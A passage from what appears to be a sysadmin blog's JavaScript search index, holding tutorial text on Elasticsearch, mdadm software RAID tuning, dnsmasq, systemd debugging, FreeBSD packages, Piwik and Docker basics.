\"_id\" : \"1\", \"_version\" : 10 } Remove a document or it’s content linkTo remove a complete document:\n\u003e curl -XDELETE 'localhost:9200/vehicule/moto/4?pretty' { \"found\" : true, \"_index\" : \"vehicule\", \"_type\" : \"moto\", \"_id\" : \"4\", \"_version\" : 3 } To remove a document field (here power):\n\u003e curl -XPOST 'localhost:9200/vehicule/moto/1/_update?pretty' -d '{ \"script\" : \"ctx._source.remove(\\\"power\\\")\" }' { \"_index\" : \"vehicule\", \"_type\" : \"moto\", \"_id\" : \"1\", \"_version\" : 13 } ElasticSearch knows how to deal with concurrency, however if you really want to be sure to safely delete a document at a certain version, you can force it. It will fail if the document has changed in the meantime:\n\u003e curl -XDELETE 'localhost:9200/vehicule/moto/4?version=15' References link https://www.elasticsearch.org/overview/ https://www.elasticsearch.org/guide/en/elasticsearch/reference/current/modules-scripting.html https://www.elasticsearch.org/guide/en/elasticsearch/reference/current/cat-nodes.html "
            }
        );
    index.add(
            {
                id:  171 ,
                href: "\/Configuration_d\u0027un_Raid_logiciel\/",
                title: "Software RAID Configuration",
                description: "Learn how to set up, monitor, and optimize software RAID configurations on Linux systems",
                content: "Introduction linkNot everyone can afford a RAID 5 card with proper disks. That’s why a small software RAID 5 can be a good solution, especially for home use!\nCreating a RAID linkRAID 1 linkTo create a RAID 1, it’s simple. You just need 2 disks with 2 partitions of the same size, then run this command:\nmdadm --create --assume-clean --verbose /dev/md0 --level=1 --raid-devices=2 /dev/sdb1 /dev/sdc1 create: creating a raid assume-clean: allows having a directly usable raid, without a complete synchronization. This requires being 100% sure that both disks/partitions are blank. level: the type of raid (here RAID 1) raid-devices: the number of disks used Monitoring linkTo see if everything is working properly, here are several solutions:\nThe /proc/mdstat file: $ cat /proc/mdstat Personalities : [raid6] [raid5] [raid4] md0 : active raid5 sdb1[0] sde1[3] sdd1[2] sdc1[1] 2930279808 blocks level 5, 64k chunk, algorithm 2 [4/4] [UUUU] unused devices: The mdadm command which will allow us to have an exact view of the raid status: $ mdadm --detail /dev/md0 /dev/md0: Version : 00.90 Creation Time : Sun Apr 12 13:36:39 2009 Raid Level : raid5 Array Size : 2930279808 (2794.53 GiB 3000.61 GB) Used Dev Size : 976759936 (931.51 GiB 1000.20 GB) Raid Devices : 4 Total Devices : 4 Preferred Minor : 0 Persistence : Superblock is persistent Update Time : Fri May 22 00:04:17 2009 State : clean Active Devices : 4 Working Devices : 4 Failed Devices : 0 Spare Devices : 0 Layout : left-symmetric Chunk Size : 64K UUID : ab6f6d7f:29cf4645:9eee7aa6:0e7eea1b Events : 0.34 Number Major Minor RaidDevice State 0 8 17 0 active sync /dev/sdb1 1 8 33 1 active sync /dev/sdc1 2 8 49 2 active sync /dev/sdd1 3 8 65 3 active sync /dev/sde1 And finally the best option, to be alerted in case of problems: mdadm --monitor --mail=xxx@mycompany.com --delay=1800 /dev/md0 I won’t go into details, the options speak for themselves.\nProblem Cases linkRelative to what we’ve seen above, here’s what happens in case of problems:\n\u003e cat /proc/mdstat Personalities : [raid6] [raid5] [raid4] md0 : active raid5 sdc1[1] sde1[3] sdd1[2] 2930279808 blocks level 5, 64k chunk, algorithm 2 [4/3] [_UUU] unused devices: And finally, a little mdadm:\n\u003e mdadm --detail /dev/md0 /dev/md0: Version : 00.90 Creation Time : Sun Apr 12 13:36:39 2009 Raid Level : raid5 Array Size : 2930279808 (2794.53 GiB 3000.61 GB) Used Dev Size : 976759936 (931.51 GiB 1000.20 GB) Raid Devices : 4 Total Devices : 3 Preferred Minor : 0 Persistence : Superblock is persistent Update Time : Sat Dec 26 21:28:19 2009 State : clean, degraded Active Devices : 3 Working Devices : 3 Failed Devices : 0 Spare Devices : 0 Layout : left-symmetric Chunk Size : 64K UUID : ab6f6d7f:29cf4645:9eee7aa6:0e7eea1b Events : 0.3727284 Number Major Minor RaidDevice State 0 0 0 0 removed 1 8 33 1 active sync /dev/sdc1 2 8 49 2 active sync /dev/sdd1 3 8 65 3 active sync /dev/sde1 Repairing Your RAID 5 linkReplace the problematic disk, then add it to your raid:\n\u003e mdadm /dev/md0 -a /dev/sdb1 mdadm: added /dev/sdb1 Now, you can monitor the restoration via this command:\n\u003e cat /proc/mdstat Personalities : [raid6] [raid5] [raid4] md0 : active raid5 sdb1[4] sdc1[1] sde1[3] sdd1[2] 2930279808 blocks level 5, 64k chunk, algorithm 2 [4/3] [_UUU] [\u003e....................] recovery = 2.3% (23379336/976759936) finish=225.0min speed=70592K/sec unused devices: We can also view the reconstruction like this:\n\u003e mdadm --detail /dev/md0 /dev/md0: Version : 00.90 Creation Time : Sun Apr 12 13:36:39 2009 Raid Level : raid5 Array Size : 2930279808 (2794.53 GiB 3000.61 GB) Used Dev Size : 976759936 (931.51 GiB 1000.20 GB) Raid Devices : 4 Total Devices : 4 Preferred Minor : 0 Persistence : Superblock is persistent Update Time : Mon Dec 28 19:38:57 2009 State : clean, degraded, recovering Active Devices : 3 Working Devices : 4 Failed Devices : 0 Spare Devices : 1 Layout : left-symmetric Chunk Size : 64K Rebuild Status : 2% complete UUID : ab6f6d7f:29cf4645:9eee7aa6:0e7eea1b Events : 0.3772106 Number Major Minor RaidDevice State 4 8 16 0 spare rebuilding /dev/sdb1 1 8 33 1 active sync /dev/sdc1 2 8 49 2 active sync /dev/sdd1 3 8 65 3 active sync /dev/sde1 Increasing RAID Performance linkI won’t discuss the different RAID types, but will rather leave Wikipedia for that1. For using software RAID under Linux, I recommend this documentation2. We’ll focus more on performance since that’s the subject here. RAID 0 is the most performant of all raids, but it obviously has its data security problems when a disk is lost.\nThe MTBF (Mean Time Between Failure) is also important on RAIDs. It’s an estimate of the good functioning of the RAID before a disk is detected as failing.\nChunk Size linkThe “Chunk size” (or stripe size or element size for some vendors) is the number (in segment size (KiB)) of data written or read for each device before moving to another segment. The algorithm used is Round Robin. The chunk size must be an integer, multiple of the block size. The larger the chunk size, the faster the write speed on very large capacity data, but conversely slower on small data. If the average size of IO requests is smaller than the size of a chunk, then the request will be placed on a single disk of the RAID, canceling all the advantages of RAID. Reducing the chunk size will break large files into smaller pieces that will be distributed across multiple disks, which will improve performance. However, the positioning time of chunks will be reduced. Some hardware doesn’t allow writing until a stripe is complete, canceling this positioning latency effect.\nA good rule to define the chunk size is to divide roughly the size of IO operations by the number of disks on the RAID (remove parity disks if RAID 5 or 6).\ninfo Quick reminder:\nRAID 0: No parity\nRAID 1: No parity\nRAID 5: 1 parity disk\nRAID 6: 2 parity disks\nRAID 10: No parity disks\nIf you have no idea about your IOs, take a value between 32KB and 128KB, taking a multiple of 2KB (or 4KB if you have larger block sizes). The chunk size (stripe size) is an important factor on the performance of your RAID. If the stripe is too wide, the raid may have a “hot spot” which will be the disk that receives the most IO and will reduce the performance of your RAID. It’s obvious that the best performance is when data is spread across all disks. The good formula is therefore:\nChunk size = average request IO size (avgrq-sz) / number of disks\nTo get the average request size, I invite you to check the Systat documentation3 where we talk about Iostat and Sar.\nTo see the chunk size on a RAID (here md0): \u003e cat /sys/block/md0/md/chunk_size 131072 It’s therefore 128KB here.\nHere’s another way to see it:\n\u003e cat /proc/mdstat Personalities : [raid10] md0 : active raid10 sdc2[3] sda2[1] sdb2[0] sdd2[2] 1949426688 blocks super 1.0 128K chunks 2 near-copies [4/4] [UUUU] unused devices: Or even:\n\u003e mdadm --detail /dev/md0 /dev/md0: Version : 1.0 Creation Time : Sat May 12 09:35:34 2012 Raid Level : raid10 Array Size : 1949426688 (1859.12 GiB 1996.21 GB) Used Dev Size : 974713344 (929.56 GiB 998.11 GB) Raid Devices : 4 Total Devices : 4 Persistence : Superblock is persistent Update Time : Thu Aug 30 12:53:20 2012 State : clean Active Devices : 4 Working Devices : 4 Failed Devices : 0 Spare Devices : 0 Layout : near=2 Chunk Size : 128K Name : N7700:2 UUID : 1a83e7dc:daa7d822:15a1de4d:e4f6fd19 Events : 64 Number Major Minor RaidDevice State 0 8 18 0 active sync /dev/sdb2 1 8 2 1 active sync /dev/sda2 2 8 50 2 active sync /dev/sdd2 3 8 34 3 active sync /dev/sdc2 It’s possible to define the chunk size when creating the RAID with the argument -c or –chunk. Let’s also see how to calculate it best. First, let’s use iostat to get the avgrq-sz value: \u003e iostat -x sda 1 5 avg-cpu: %user %nice%system%iowait %steal %idle 0,21 0,00 0,29 0,05 0,00 99,45 Device: rrqm/s wrqm/s r/s w/s rsec/s wsec/s avgrq-sz avgqu-sz await svctm %util sda 0,71 1,25 1,23 0,76 79,29 15,22 47,55 0,01 2,84 0,73 0,14 avg-cpu: %user %nice%system%iowait %steal %idle 0,00 0,00 0,00 0,00 0,00 100,00 Device: rrqm/s wrqm/s r/s w/s rsec/s wsec/s avgrq-sz avgqu-sz await svctm %util sda 0,00 0,00 1,00 0,00 16,00 0,00 16,00 0,00 1,00 1,00 0,10 avg-cpu: %user %nice%system%iowait %steal %idle 0,00 0,00 0,00 0,00 0,00 100,00 Let’s then do the calculation to get the chunk size in KiB:\n\u003e echo \"47.55*512/1024\" | bc -l 23.77500000000000000000 We must then divide this value by the number of disks (let’s say 2) and round it to the nearest multiple of 2:\nChunk Size(KB) = 23.775/2 = 11.88 ≈ 8\nHere the chunk size to set is 8, since it’s the multiple of 2 that is closest to 11.88.\nwarning Remember that it’s not recommended to go below 32K! To create a raid 0 by defining the chunk size:\nmdadm -C /dev/md0 -l 0 -n 2 --chunk-size=32 /dev/sd[ab]1 Stride linkThe Stride is a parameter that we pass during the construction of a RAID that optimizes the way the filesystem will place its data blocks on the disks before moving to the next ones. With extXn, we can optimize by using the -E option which corresponds to the number of filesystem blocks in a chunk. To calculate the stride:\nStride = chunk size / block size\nFor a raid 0 having a chunk size of 64KiB (64 KiB / 4KiB = 16) for example:\nmkfs.ext4 -b 4096 -E stride=16 /dev/mapper/vg1-lv0 Some disk controllers do a physical abstraction of block groups making it impossible for the kernel to know them. Here’s an example to see the size of a stride:\n\u003e dumpe2fs /dev/mapper/vg1-lv0 | grep -i stride dumpe2fs 1.42 (29-Nov-2011) RAID stride: 16 Here, the size is 16 KiB.\nTo calculate the stride, there’s also a website: http://busybox.net/~aldot/mkfs_stride.html\nRound Robin linkRAIDs without parity allow data segmentation across multiple disks to increase performance using the Round Robin algorithm. The segment size is defined at the creation of the RAID and refers to the chunk size.\nThe size of a RAID is defined by the smallest disk at the creation of the RAID. The size can vary in the future if all disks are replaced by larger capacity disks. A resynchronization of the disks will take place and the filesystem can be extended.\nSo for Round Robin tuning, you need to properly tune the chunk size and stride so that the usage of the algorithm is optimal! That’s all :-)\nParity RAIDs linkOne of the big performance constraints of RAID 5 and 6 is parity calculation. For data to be written, parity calculation must be performed on the raid beforehand. and only then can parity and data be written.\nwarning Avoid RAID 5 and 6 if writing your data represents more than 20% of the activity Each data update requires 4 IO operations:\nThe data to be updated is first read from the disks Update of the new data (but the parity is not yet correct) Reading of blocks of the same stripe and parity calculation Final writing of new data to disks and parity In RAID 5, it’s recommended to use stripe caching:\necho 256 \u003e /sys/block/md0/md/stripe_cache_size For more information on RAID optimizations: http://kernel.org/doc/Documentation/md.txt[^4][^5]. For the optimization part, look at the following parameters:\nchunk_size component_size new_dev safe_mode_delay syncspeed{min,max} sync_action stripe_cache_size RAID 1 linkThe RAID driver writes to the bitmap when changes have been detected since the last synchronization. A major drawback of RAID 1 is during a power cut, since it has to be entirely rebuilt. With the ‘write-intent’ bitmap, only the parts that have changed will have to be synchronized, which greatly reduces the reconstruction time.\nIf a disk fails and is removed from the RAID, md stops erasing bits in the bitmap. If this same disk is reintroduced into the RAID, md will only have to resynchronize the difference. When creating the RAID, if the ‘–write-intent’ bitmap option is combined with ‘–write-behind’, write requests to devices with the ‘–write-mostly’ option will not wait for the requests to be complete before writing to the disk. The ‘–write-behind’ option can be used for RAID1 with slow connections.\nThe new mdraid matrices support the use of write intent bitmaps. This helps the system identify problematic parts of a matrix; thus, in case of an incorrect stop, the problematic parts will have to be resynchronized, not the entire disk. This drastically reduces the time required for resynchronization. Newly created matrices will automatically have a write intent bitmap added when possible. For example, matrices used as swap and very small matrices (such as /boot matrices) will not benefit from obtaining write intent bitmaps. It’s possible to add write intent bitmap to previously existing matrices once the update on the device is completed via the mdadm –grow command. However, write intent bitmaps don’t incur a performance impact (about 3-5% on a bitmap size of 65536, but can increase up to 10% or more on smaller bitmaps, such as 8192). This means that if write intent bitmap is added to a matrix, it’s better to keep the size relatively large. The recommended size is 65536.4\nTo see if a RAID is persistent:\n\u003e mdadm --detail /dev/md0 /dev/md0: Version : 1.0 Creation Time : Sat May 12 09:35:34 2012 Raid Level : raid10 Array Size : 1949426688 (1859.12 GiB 1996.21 GB) Used Dev Size : 974713344 (929.56 GiB 998.11 GB) Persistence : Superblock is persistent Update Time : Thu Aug 30 16:43:17 2012 State : clean Active Devices : 4 Working Devices : 4 Failed Devices : 0 Spare Devices : 0 Layout : near=2 Chunk Size : 128K Name : N7700:2 UUID : 1a83e7dc:daa7d822:15a1de4d:e4f6fd19 Events : 64 Number Major Minor RaidDevice State 0 8 18 0 active sync /dev/sdb2 1 8 2 1 active sync /dev/sda2 2 8 50 2 active sync /dev/sdd2 3 8 34 3 active sync /dev/sdc2 To add the write intent bitmap (internal):\nmdadm /dev/md0 --grow --bitmap=internal To add the write intent bitmap (external):\nmdadm /dev/md0 --grow --bitmap=/mnt/my_file And to remove it:\nmdadm /dev/md0 --grow --bitmap=none To define the slow disk and the fastest one:\nmdadm -C /dev/md0 -l1 -n2 -b /tmp/md0 --write-behind=256 /dev/sdal --write-mostly /dev/sdbl FAQ linkI have an md127 appearing and my md0 is broken linkFirst, you need to repair the RAID with mdadm. Then, you need to add the current configuration to mdadm.conf, so that at boot time, it doesn’t try to guess a wrong configuration. Simply run this command when your RAID is working properly:\nmdadm --detail --scan --verbose \u003e\u003e /etc/mdadm/mdadm.conf 5\nReferences link http://fr.wikipedia.org/wiki/RAID_%28informatique%29 ↩︎\nSoftware RAID Configuration ↩︎\nSysstat: Essential tools for analyzing performance problems ↩︎\nhttps://access.redhat.com/knowledge/docs/fr-FR/Red_Hat_Enterprise_Linux/6/html/Migration_Planning_Guide/chap-Migration_Guide-File_Systems.html ↩︎\nhttp://www.linuxpedia.fr/doku.php/expert/mdadm ↩︎\n"
            }
        );
    index.add(
            {
                id:  172 ,
                href: "\/Dnsmasq_and_dhclient:_use_a_specific_DNS_for_a_specific_domain\/",
                title: "Dnsmasq and dhclient: use a specific DNS for a specific domain",
                description: "Configure dnsmasq and dhclient to use a specific DNS server for a specific domain, allowing you to resolve local domain names from different networks.",
                content: " Software version isc-dhcp-client 4.3.0 dnsmasq 2.71 Operating System Debian 8 Website Debian Website Last Update 27/07/2014 Introduction linkMy use case is specific but not isolated. When I’m at work, I’m connected to my VPN at home. I have a specific DNS at home for my domain in deimos.lan and this is very useful to avoid me to remind all the IP of the services I have.\nSometimes, I want to connect to a home service from the VPN, but my bookmarks are with the local DNS at home which is of course not known from the DNS at work. A solution is to add specifics entries in /etc/hosts but it quickly starts to be very boring. That’s why I’ve searched a solution to use my DNS at home only when I try to reach deimos.lan domain.\nInstallation linkFirst of all, I need a dhcp client (as I have a DHCP server at home and at work) and dnsmasq to run locally on my laptop:\naptitude install dnsmasq isc-dhcp-client Configuration linkDnsmasq linkWe’re going to setup dnsmasq like this:\nserver=/deimos.lan/192.168.0.1 interface=lo listen-address=127.0.0.1 bind-interfaces Here are explanations:\nserver: you need to specify for the domain (deimos.lan) which DNS server should be targeted (192.168.0.1) interface: the interface to listen on listen-address: only listen to 127.0.0.1 IP address bind-interfaces: only bind to specified interfaces (here: lo) And restart dnsmasq to apply this new configuration.\nDHCP client linkIf we now change resolv.conf values to point to the DNS 127.0.0.1, we will be correctly redirected. But the problem is everytime the dhcp lease will expire and renewed, it will change the resolv.conf file. To avoid it, we’re going to add this line in the dhclient configuration file:\nprepend domain-name-servers 127.0.0.1; This will force the first “nameserver” line in resolv.conf to be 127.0.0.1. To finish, restart the dhclient service to have this new version working.\ninfo On RedHat OS like, you may need to add this line “PEERDNS=yes” in your network configuration file "
            }
        );
    index.add(
            {
                id:  173 ,
                href: "\/MFi:_install_a_Ubiquiti_server_to_manage_powerstrips\/",
                title: "MFi: Install a Ubiquiti server to manage powerstrips",
                description: "A guide on installing and configuring a Ubiquiti mFi server on Debian Linux to manage powerstrips",
                content: " Software version 2.0.24 Operating System Debian 7 Website Ubiquiti Website Last Update 27/07/2014 Introduction linkUbiquiti brings software that are easy to install on Windows and Mac OS. However as it is strongly recommended to let this software always up, it’s preferable to have a Linux version to run it in a container or a virtual machine. That’s why I decided to install it for a powerstrip mPower on Debian inside LXC. The documentation is very poor, that’s why I made this one for those who want to do like me.\nInstallation linkFirst of all, download the mFi server here. Then install prerequisites:\naptitude install unzip mongodb openjdk-7-jre-headless openjdk-7-jre Then unzip the archive file and move it to a better folder:\nunzip mFi.unix.zip mv mFi /usr/share/ Now set the service to start at boot:\ncd /usr/share/mFi/ ; java -jar lib/ace.jar start \u0026 Now you can start the service by hand to check it works fine:\ncd /usr/share/mFi/ ; java -jar lib/ace.jar start Configuration linkOn the server, there is nothing to do especially. However on the powerstrip, you need to access to the web interface and configure them as follow:\nConfiguration Controller: Personal Address: ubiquiti-server-IP or DNS User: Password: You need to adapt all fields to fit your server interface.\nUsage linkYou can now access to the web interface like this https://ubiquiti-server-IP:6443 and you should have an interface to configure your powerstrips:\n"
            }
        );
    index.add(
            {
                id:  174 ,
                href: "\/Systemd:_how_to_debug_on_boot_fail\/",
                title: "Systemd: How to Debug on Boot Failure",
                description: "Guide on how to debug systemd boot failures including checking failed services, getting service status information and troubleshooting techniques.",
                content: " Software version 208-6 Operating System Debian 8 Last Update 27/07/2014 Introduction linksystemd1 is a system and service manager for Linux, compatible with SysV and LSB init scripts. Systemd provides aggressive parallelization capabilities, uses socket and D-Bus activation for starting services, offers on-demand starting of daemons, keeps track of processes using Linux control groups, supports snapshotting and restoring of the system state, maintains mount and automount points and implements an elaborate transactional dependency-based service control logic.\nWhen I decided to migrate to Systemd on Debian, it unfortunately worked at the first time. That’s why I need to deep dive into Systemd issues and understand why it wasn’t working.\nUsage linkFirst of all, you have to search for failed services:\n\u003e systemctl --state=failed To get more information on a service:\nsystemctl status Try to know more on the specific PID (may not work in some cases):\n\u003e journalctl -b _PID= Generally, it is because of modules that don’t load properly or shouldn’t load. Make your changes, try to start the problematic services:\n\u003e systemctl start Now things should be ok\nReferences link https://wiki.archlinux.org/index.php/Systemd ↩︎\n"
            }
        );
    index.add(
            {
                id:  175 ,
                href: "\/Le_syst%C3%A8me_de_Packages_FreeBSD\/",
                title: "FreeBSD Package System",
                description: "A guide to understanding and using FreeBSD's package management system including both the new and old methods, portage system, and system updates.",
                content: "Introduction linkFreeBSD is one of the most widely used BSD distributions for servers as it is very up-to-date and offers a very comprehensive port system (more than 16,000 ports available). Additionally, it integrates advanced functions at the source level.\nThis allows you, for example, to modify parameters to best adapt to your needs, similar to Gentoo.\nPrecompiled Packages linkNew Method linkThe latest method involves using pkgng. To set it up, you need to convert the current database:\npkg2ng Then modify/add this line:\n/etc/make.conf And modify the base repository if you cannot access it (as at the time of writing, a security incident has forced the removal of binary packages from the official site):\npackagesite: http://mirror.exonetric.net/pub/pkgng/${ABI}/latest #packagesite: http://pkgbeta.FreeBSD.org/freebsd:9:x86:32/latest All that remains is to update the repositories:\npkg update And to install software:\npkg install Old Method linkAdding Software linkIf I want to install lsof with FreeBSD packages:\npkg_add -r lsof Finding Installed Software linkpkg_version is a utility that summarizes the versions of all pre-compiled software installed:\npkg_version If you want a description of the software installed on your machine:\npkg_info Symbols Meanings = The installed pre-compiled software version is equivalent to that found in the local ports catalog. \u003c The installed version is older than the one available in the ports catalog. \u003e The installed version is newer than the one found in the local ports catalog. (The local ports catalog is probably outdated) ? The pre-compiled software cannot be found in the ports catalog index. (This can happen when, for example, installed software is removed from the ports catalog or renamed.) * There are multiple versions of this pre-compiled software. Deleting a Package linkTo delete an installed package:\npkg_delete The Portage System linkSearching for a Package linkFor example, if you are looking for lsof:\n# cd /usr/ports # make search name=lsof Port: lsof-4.56.4 Path: /usr/ports/sysutils/lsof Info: Lists information about open files (similar to fstat(1)) Maint: obrien@FreeBSD.org Index: sysutils B-deps: R-deps: You need to use make search key=string.\nUpdating Security Patches linkTo update security patches:\nfreebsd-update fetch freebsd-update install If you want to rollback:\nfreebsd-update rollback You can also be notified when updates are available by adding this line to the crontab:\n@daily root freebsd-update cron Updating Your FreeBSD linkTo upgrade from one version to another, run this command indicating the version you want to upgrade to (here 10.0):\nfreebsd-update -r 10.0-RELEASE upgrade This command will download updates and merge them. Then reboot, apply the updates:\nfreebsd-update install Reboot and run this command again.\n"
            }
        );
    index.add(
            {
                id:  176 ,
                href: "\/Piwik_:_Des_statistiques_pour_votre_site_web\/",
                title: "Piwik: Statistics for Your Website",
                description: "A guide to installing and configuring Piwik (now Matomo), an open-source alternative to Google Analytics for website statistics tracking and analysis.",
                content: " Introduction linkI’ve been using Piwik for over a year and hadn’t written an article about it yet. This is the opportunity to show you this equivalent to Google Analytics.\nPrerequisites linkSet up a database on a MySQL instance that you’ll use during the installation.\nInstallation linkNavigate to your web directory:\ncd /var/www wget http://piwik.org/latest.zip unzip latest.zip rm How\\ to\\ install\\ Piwik.html latest.zip chown -Rf www-data. piwik Then launch the installer at http://server/piwik\nConfiguration linkWeb Server linkHere are some web server configurations you might need.\nNginx linkFor Piwik, here’s the configuration (/etc/nginx/sites-available/piwik.deimos.fr):\nserver { include listen_port.conf; listen 443 ssl; ssl_certificate /etc/nginx/ssl/deimos.fr/server-unified.crt; ssl_certificate_key /etc/nginx/ssl/deimos.fr/server.key; ssl_session_timeout 5m; server_name piwik.deimos.fr; root /usr/share/nginx/www/deimos.fr/piwik; index index.php; access_log /var/log/nginx/piwik.deimos.fr_access.log; error_log /var/log/nginx/piwik.deimos.fr_error.log; # Drop config include drop.conf; location / { try_files $uri $uri/ /index.php?$args; } location ~ \\.php$ { fastcgi_cache mycache; fastcgi_cache_key $request_method$host$request_uri; fastcgi_cache_valid any 1h; include fastcgi_params; fastcgi_pass unix:/var/run/php5-fpm.sock; fastcgi_intercept_errors on; } location ~* \\.(js|css|png|jpg|jpeg|gif|ico)$ { expires max; log_not_found off; } } Piwik linkWe’ll create a cron job to optimize Piwik’s performance:\n5 * * * * php /var/www/deimos.fr/piwik/console core:archive --url=https://piwik.deimos.fr \u003e\u003e /var/log/piwik.log Once the crontab is added, we’ll configure the web interface to stop automatically processing data when accessing a report. Go to:\nSettings \u003e General Settings tab Let Piwik archiving trigger when reports are viewed from a browser: No Reports for today (or any date range including today) will be processed at most every: 3600 seconds The Piwik configuration is now complete. You need to add sites and configure them to send stats to Piwik.\nMediaWiki linkPiwik is an equivalent of Google Analytics, but free. It enables you to have statistics for your website with nice graphs etc. There is a plugin that allows you to insert code in each page (necessary), but it’s obsolete and has security vulnerabilities. We’ll use another module that will simply allow us to insert this type of code.\nYou need to install the PCR GUI Inserts module which allows you to insert information at various locations on your pages. First, activate the extension by adding these lines:\n# PCR Extension for Piwik / Google Ads require_once(\"$IP/extensions/pcr/pcr_guii.php\"); Insert this into the MediaWiki configuration file:\n# PCR Piwik $wgPCRguii_Inserts['SkinAfterBottomScripts']['on'] = true; $wgPCRguii_Inserts['SkinAfterBottomScripts']['content'] = ' '; Gitweb linkIf you want to integrate with Piwik, it’s quite simple. I created a patch - you’ll need to modify the JavaScript code to display in your page:\n*** gitweb.old\t2011-04-05 14:05:06.120951481 +0200 --- gitweb.cgi\t2011-04-05 14:04:41.913944817 +0200 *************** *** 3612,3617 **** --- 3612,3633 ---- qq!\\n!; } + + print \u003c"
            }
        );
    index.add(
            {
                id:  177 ,
                href: "\/Docker_:_manage_LXC_containers_easily_with_advanced_features\/",
                title: "Docker: Manage Containers Easily with Advanced Features",
                description: "Learn how to use Docker to manage LXC containers with advanced features including installation, configuration, and basic operations.",
                content: " Software version 0.11.1 Operating System Debian 8 Website Docker Website Last Update 09/07/2014 Introduction linkDocker1 is an open-source engine that automates the deployment of any application as a lightweight, portable, self-sufficient container that will run virtually anywhere.\nDocker containers can encapsulate any payload, and will run consistently on and between virtually any server. The same container that a developer builds and tests on a laptop will run at scale, in production*, on VMs, bare-metal servers, OpenStack clusters, public instances, or combinations of the above.\nCommon use cases for Docker include:\nAutomating the packaging and deployment of applications Creation of lightweight, private PAAS environments Automated testing and continuous integration/deployment Deploying and scaling web apps, databases and backend services In short, Docker needs a kernel version 3.8 or above to get AUFS support. This is needed for version \u003c 0.7 as it uses AUFS. In 0.7 version AUFS support will be replaced by Device Mappers to avoid having a recent Linux kernel version.\nInstallation linkThe problem on Debian with the package, is there is an already existing package called docker. That’s why you need to install docker.io:\naptitude install docker.io lxc And to make it simpler, set an alias or create a symlink from ‘docker.io’ to ‘docker’.\nIf you want the latest version, this this a single binary:\nwget https://get.docker.io/builds/Linux/x86_64/docker-latest -O /usr/bin/docker chmod 755 /usr/bin/docker Configuration linkLXC linkWe will need to make some change regarding the boot of the machine to enable memory managment in the containers by adding ‘cgroup_enable’ and ‘swapaccount’ parameters:\nGRUB_CMDLINE_LINUX_DEFAULT=\"quiet cgroup_enable=memory swapaccount=1\" Then update grub and reboot your machine:\nupdate-grub reboot Docker linkIf you want to change the destination directory where dockers containers will be stored, you simply can use -g option. If you installed with the package, you can modify that parameter here:\n[...] DOCKER_OPTS=\"-g /home/pmavro/.docker\" [...] Here, I can see the folder where I store my docker images and containers.\nUsage linkNow you’re ready for the usage. We’ll see here the basics and some interesting usages.\nGet images linkThe first things to do is to get the wanted images you want to work with:\ndocker pull debian docker pull ubuntu docker pull centos Here I download Centos and Debian.\nList images linkYou can now list available images like that:\n\u003e docker images REPOSITORY TAG IMAGE ID CREATED VIRTUAL SIZE debian latest e565fbbc6033 4 weeks ago 115 MB debian 7.4 e565fbbc6033 4 weeks ago 115 MB debian wheezy e565fbbc6033 4 weeks ago 115 MB debian 6.0.9 bc3c71bec50b 4 weeks ago 112.3 MB debian squeeze bc3c71bec50b 4 weeks ago 112.3 MB debian jessie 4bd7c3e53dc0 4 weeks ago 120.9 MB debian testing ecd2aa2561ea 4 weeks ago 120.9 MB debian sid 1cda8535c670 4 weeks ago 122.7 MB debian oldstable 2cdcb7d79857 4 weeks ago 112.4 MB debian experimental df8f36b7b798 4 weeks ago 159.2 MB debian rc-buggy 85f0637e82fc 4 weeks ago 159.2 MB debian unstable e5c43625d004 4 weeks ago 122.7 MB centos centos6 0b443ba03958 5 weeks ago 297.6 MB centos latest 0b443ba03958 5 weeks ago 297.6 MB debian stable d8309758b8fe 6 weeks ago 115 MB debian 6.0.8 d56191e18d6b 3 months ago 113.1 MB debian 7.3 b5fe16f2ccba 3 months ago 117.7 MB centos 6.4 539c0211cd76 13 months ago 300.6 MB [...] Launch a container linkWhen you want to start a container:\n\u003e docker run -i -t debian bash root@509d83d55238:/# exit -i: Keep STDIN open -t: Allocate a psuedo-TTY You can exit a container with exit.\nList containers linkYou can list running containers:\n\u003e docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES And to list running and stopped containers:\n\u003e docker ps -a CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 509d83d55238 debian:7.4 /bin/bash 3 minutes ago Exited (0) 3 minutes ago distracted_lalande Start container linkIf a container is stopped, you can easily start it with container ID:\n\u003e docker start 509d83d55238 509d83d55238 Then you can see it:\n\u003e docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 509d83d55238 debian:7.4 /bin/bash 5 minutes ago Up 5 seconds distracted_lalande Connect to a container linkTo connect to a started container, you need to attach to it:\n\u003e docker attach 509d83d55238 root@509d83d55238:/# Commit changes linkNow comes interesting things. You can commit changes you’ve made on a container. That will help you to easily roll back changes for example. So let’s install vim or anything to make changes and then commit:\n\u003e docker commit 509d83d55238 deimosfr/tests 48d436fd27903337c79fca6738f7702ea0eec4304fd0cbd5ebea95854bc9f94e 509d83d55238: the container ID on which you want to commit (get it with ‘docker ps -a’ command) deimosfr/tests: the name of the commit Now if you look at the current available images, you’ll see your new one:\n\u003e docker images REPOSITORY TAG IMAGE ID CREATED VIRTUAL SIZE deimosfr/tests latest 48d436fd2790 2 minutes ago 170 MB Diff changes linkYou can see a diff between a commited version and the changes you’ve made like that:\n\u003e docker diff 509d83d55238 A /etc/alternatives/vi A /etc/vim A /etc/vim/vimrc C /usr C /usr/bin A /usr/bin/editor A /usr/bin/vi A /usr/bin/view A /usr/bin/vim A /usr/bin/vim.basic A /usr/share/bug/vim/script A /usr/share/doc/vim [...] References link http://www.docker.io/learn_more/ ↩︎\n"
            }
        );
    index.add(
            {
                id:  178 ,
                href: "\/Seafile:%C2%A0make%C2%A0your%C2%A0personal%C2%A0storage%C2%A0cloud%C2%A0easily\/",
                title: "Seafile: Make Your Personal Storage Cloud Easily",
                description: "Learn how to install and configure Seafile cloud storage system on Debian 7 with Nginx and MariaDB/MySQL.",
